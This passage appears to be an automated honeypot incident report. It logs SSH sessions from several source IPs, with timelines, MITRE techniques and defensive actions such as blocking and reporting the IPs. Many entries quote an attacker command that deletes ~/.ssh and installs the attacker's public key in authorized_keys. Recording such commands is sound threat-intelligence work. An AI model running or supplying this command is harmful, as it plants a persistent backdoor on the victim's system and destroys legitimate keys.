| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:57:50` | `cowrie.session.connect` |
| `2026-05-20 19:57:50` | `cowrie.client.version` |
| `2026-05-20 19:57:50` | `cowrie.client.kex` |
| `2026-05-20 19:57:51` | `cowrie.login.success` |
| `2026-05-20 19:57:52` | `cowrie.session.params` |
| `2026-05-20 19:57:52` | `cowrie.command.input` |
| `2026-05-20 19:57:52` | `cowrie.command.failed` |
| `2026-05-20 19:57:52` | `cowrie.log.closed` |
| `2026-05-20 19:57:53` | `cowrie.session.params` |
| `2026-05-20 19:57:53` | `cowrie.command.input` |
| `2026-05-20 19:57:53` | `cowrie.session.file_download` |
| `2026-05-20 19:57:53` | `cowrie.log.closed` |
| `2026-05-20 19:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ef2e7907f8

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:57 |
| **Last Seen** | 2026-05-20 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:57:55` | `cowrie.session.connect` |
| `2026-05-20 19:57:55` | `cowrie.client.version` |
| `2026-05-20 19:57:56` | `cowrie.client.kex` |
| `2026-05-20 19:57:57` | `cowrie.login.success` |
| `2026-05-20 19:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc78f018728d

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-20 19:58 |
| **Last Seen** | 2026-05-20 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:58:22` | `cowrie.session.connect` |
| `2026-05-20 19:58:22` | `cowrie.client.version` |
| `2026-05-20 19:58:22` | `cowrie.client.kex` |
| `2026-05-20 19:58:23` | `cowrie.login.success` |
| `2026-05-20 19:58:23` | `cowrie.session.params` |
| `2026-05-20 19:58:23` | `cowrie.command.input` |
| `2026-05-20 19:58:23` | `cowrie.command.failed` |
| `2026-05-20 19:58:24` | `cowrie.log.closed` |
| `2026-05-20 19:58:24` | `cowrie.session.params` |
| `2026-05-20 19:58:24` | `cowrie.command.input` |
| `2026-05-20 19:58:24` | `cowrie.session.file_download` |
| `2026-05-20 19:58:24` | `cowrie.log.closed` |
| `2026-05-20 19:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68182a881e86

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 19:58 |
| **Last Seen** | 2026-05-20 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:58:26` | `cowrie.session.connect` |
| `2026-05-20 19:58:26` | `cowrie.client.version` |
| `2026-05-20 19:58:26` | `cowrie.client.kex` |
| `2026-05-20 19:58:27` | `cowrie.login.success` |
| `2026-05-20 19:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9147214eba24

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:58 |
| **Last Seen** | 2026-05-20 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:58:57` | `cowrie.session.connect` |
| `2026-05-20 19:58:57` | `cowrie.client.version` |
| `2026-05-20 19:58:57` | `cowrie.client.kex` |
| `2026-05-20 19:58:57` | `cowrie.login.success` |
| `2026-05-20 19:58:57` | `cowrie.session.params` |
| `2026-05-20 19:58:57` | `cowrie.command.input` |
| `2026-05-20 19:58:57` | `cowrie.command.failed` |
| `2026-05-20 19:58:57` | `cowrie.log.closed` |
| `2026-05-20 19:58:57` | `cowrie.session.params` |
| `2026-05-20 19:58:57` | `cowrie.command.input` |
| `2026-05-20 19:58:57` | `cowrie.session.file_download` |
| `2026-05-20 19:58:57` | `cowrie.log.closed` |
| `2026-05-20 19:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc3e6ca49530

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:58 |
| **Last Seen** | 2026-05-20 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:58:58` | `cowrie.session.connect` |
| `2026-05-20 19:58:58` | `cowrie.client.version` |
| `2026-05-20 19:58:58` | `cowrie.client.kex` |
| `2026-05-20 19:58:59` | `cowrie.login.success` |
| `2026-05-20 19:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3341b9fdc25a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:59 |
| **Last Seen** | 2026-05-20 19:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:59:13` | `cowrie.session.connect` |
| `2026-05-20 19:59:13` | `cowrie.client.version` |
| `2026-05-20 19:59:13` | `cowrie.client.kex` |
| `2026-05-20 19:59:14` | `cowrie.login.success` |
| `2026-05-20 19:59:15` | `cowrie.session.params` |
| `2026-05-20 19:59:15` | `cowrie.command.input` |
| `2026-05-20 19:59:15` | `cowrie.command.failed` |
| `2026-05-20 19:59:15` | `cowrie.log.closed` |
| `2026-05-20 19:59:15` | `cowrie.session.params` |
| `2026-05-20 19:59:15` | `cowrie.command.input` |
| `2026-05-20 19:59:16` | `cowrie.session.file_download` |
| `2026-05-20 19:59:16` | `cowrie.log.closed` |
| `2026-05-20 19:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24fbe4c9fe34

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:59 |
| **Last Seen** | 2026-05-20 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:59:18` | `cowrie.session.connect` |
| `2026-05-20 19:59:18` | `cowrie.client.version` |
| `2026-05-20 19:59:19` | `cowrie.client.kex` |
| `2026-05-20 19:59:19` | `cowrie.login.success` |
| `2026-05-20 19:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a621c7eb5e5a

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-20 19:59 |
| **Last Seen** | 2026-05-20 19:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:59:35` | `cowrie.session.connect` |
| `2026-05-20 19:59:35` | `cowrie.client.version` |
| `2026-05-20 19:59:35` | `cowrie.client.kex` |
| `2026-05-20 19:59:35` | `cowrie.login.success` |
| `2026-05-20 19:59:36` | `cowrie.session.params` |
| `2026-05-20 19:59:36` | `cowrie.command.input` |
| `2026-05-20 19:59:36` | `cowrie.command.failed` |
| `2026-05-20 19:59:36` | `cowrie.log.closed` |
| `2026-05-20 19:59:36` | `cowrie.session.params` |
| `2026-05-20 19:59:36` | `cowrie.command.input` |
| `2026-05-20 19:59:36` | `cowrie.session.file_download` |
| `2026-05-20 19:59:36` | `cowrie.log.closed` |
| `2026-05-20 19:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b27f2c2ddacf

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 19:59 |
| **Last Seen** | 2026-05-20 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:59:38` | `cowrie.session.connect` |
| `2026-05-20 19:59:38` | `cowrie.client.version` |
| `2026-05-20 19:59:39` | `cowrie.client.kex` |
| `2026-05-20 19:59:39` | `cowrie.login.success` |
| `2026-05-20 19:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b054be2955db

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:00 |
| **Last Seen** | 2026-05-20 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:00:46` | `cowrie.session.connect` |
| `2026-05-20 20:00:46` | `cowrie.client.version` |
| `2026-05-20 20:00:46` | `cowrie.client.kex` |
| `2026-05-20 20:00:46` | `cowrie.login.success` |
| `2026-05-20 20:00:47` | `cowrie.session.params` |
| `2026-05-20 20:00:47` | `cowrie.command.input` |
| `2026-05-20 20:00:47` | `cowrie.command.failed` |
| `2026-05-20 20:00:47` | `cowrie.log.closed` |
| `2026-05-20 20:00:47` | `cowrie.session.params` |
| `2026-05-20 20:00:47` | `cowrie.command.input` |
| `2026-05-20 20:00:47` | `cowrie.session.file_download` |
| `2026-05-20 20:00:47` | `cowrie.log.closed` |
| `2026-05-20 20:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9890aca66c

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 20:00 |
| **Last Seen** | 2026-05-20 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:00:49` | `cowrie.session.connect` |
| `2026-05-20 20:00:49` | `cowrie.client.version` |
| `2026-05-20 20:00:50` | `cowrie.client.kex` |
| `2026-05-20 20:00:50` | `cowrie.login.success` |
| `2026-05-20 20:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a1f1056da6c

| Field | Detail |
|---|---|
| **Source IP** | `222.172.32[.]246` |
| **First Seen** | 2026-05-20 20:01 |
| **Last Seen** | 2026-05-20 20:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:01:11` | `cowrie.session.connect` |
| `2026-05-20 20:01:11` | `cowrie.client.version` |
| `2026-05-20 20:01:11` | `cowrie.client.kex` |
| `2026-05-20 20:01:12` | `cowrie.login.success` |
| `2026-05-20 20:01:12` | `cowrie.session.params` |
| `2026-05-20 20:01:12` | `cowrie.command.input` |
| `2026-05-20 20:01:12` | `cowrie.command.failed` |
| `2026-05-20 20:01:12` | `cowrie.log.closed` |
| `2026-05-20 20:01:13` | `cowrie.session.params` |
| `2026-05-20 20:01:13` | `cowrie.command.input` |
| `2026-05-20 20:01:13` | `cowrie.session.file_download` |
| `2026-05-20 20:01:13` | `cowrie.log.closed` |
| `2026-05-20 20:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.172.32[.]246` to AbuseIPDB if not already reported
- [ ] Block `222.172.32[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edad852d455c

| Field | Detail |
|---|---|
| **Source IP** | `222.172.32[.]246` |
| **First Seen** | 2026-05-20 20:01 |
| **Last Seen** | 2026-05-20 20:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:01:21` | `cowrie.session.connect` |
| `2026-05-20 20:01:21` | `cowrie.client.version` |
| `2026-05-20 20:01:21` | `cowrie.client.kex` |
| `2026-05-20 20:01:22` | `cowrie.login.success` |
| `2026-05-20 20:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.172.32[.]246` to AbuseIPDB if not already reported
- [ ] Block `222.172.32[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f6af9288b4

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:01 |
| **Last Seen** | 2026-05-20 20:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:01:52` | `cowrie.session.connect` |
| `2026-05-20 20:01:52` | `cowrie.client.version` |
| `2026-05-20 20:01:52` | `cowrie.client.kex` |
| `2026-05-20 20:01:53` | `cowrie.login.success` |
| `2026-05-20 20:01:53` | `cowrie.session.params` |
| `2026-05-20 20:01:53` | `cowrie.command.input` |
| `2026-05-20 20:01:53` | `cowrie.command.failed` |
| `2026-05-20 20:01:54` | `cowrie.log.closed` |
| `2026-05-20 20:01:54` | `cowrie.session.params` |
| `2026-05-20 20:01:54` | `cowrie.command.input` |
| `2026-05-20 20:01:54` | `cowrie.session.file_download` |
| `2026-05-20 20:01:54` | `cowrie.log.closed` |
| `2026-05-20 20:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94be8f86934b

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 20:01 |
| **Last Seen** | 2026-05-20 20:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:01:56` | `cowrie.session.connect` |
| `2026-05-20 20:01:56` | `cowrie.client.version` |
| `2026-05-20 20:01:56` | `cowrie.client.kex` |
| `2026-05-20 20:01:57` | `cowrie.login.success` |
| `2026-05-20 20:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84285e73134f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:02 |
| **Last Seen** | 2026-05-20 20:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:02:35` | `cowrie.session.connect` |
| `2026-05-20 20:02:35` | `cowrie.client.version` |
| `2026-05-20 20:02:36` | `cowrie.client.kex` |
| `2026-05-20 20:02:38` | `cowrie.login.success` |
| `2026-05-20 20:02:38` | `cowrie.session.params` |
| `2026-05-20 20:02:38` | `cowrie.command.input` |
